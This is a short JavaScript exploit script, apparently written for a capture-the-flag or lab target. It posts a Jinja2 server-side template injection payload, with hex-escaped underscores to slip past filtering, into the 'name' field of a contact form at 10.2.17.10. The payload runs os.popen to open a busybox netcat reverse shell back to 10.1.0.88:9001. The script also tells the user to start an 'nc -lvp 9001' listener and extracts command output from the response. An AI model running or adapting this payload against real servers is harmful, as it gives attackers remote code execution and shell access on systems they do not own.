export {};
console.log("Start your listener with 'nc -lvp 9001'");

const targetIp = "10.1.0.88";
const targetPort = "9001";

const bashCommand = `export PATH=/bin:/usr/bin/:/var/www/flask/flaskenv/bin ; busybox nc ${targetIp} ${targetPort} -e "script"`;
const payload = `{% print(request["application"]["\\x5f\\x5fglobals\\x5f\\x5f"]["\\x5f\\x5fbuiltins\\x5f\\x5f"]["\\x5f\\x5fimport\\x5f\\x5f"]("os")["popen"]("/bin/sh -c '"'${bashCommand}'"'")["read"]()) %}`;

const result = await fetch("http://10.2.17.10/contact", {
  headers: {
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `name=${payload}&email=1&telefonnummer=1&freitext=1`,
  method: "POST",
});

const text = await result.text();
console.log(
  text
    .replace(/[\s\S]*Thank you for your Request Mr\/Ms /m, "")
    .replace(/\. We will contact you in the next 24 hours[\s\S]*/m, "")
);
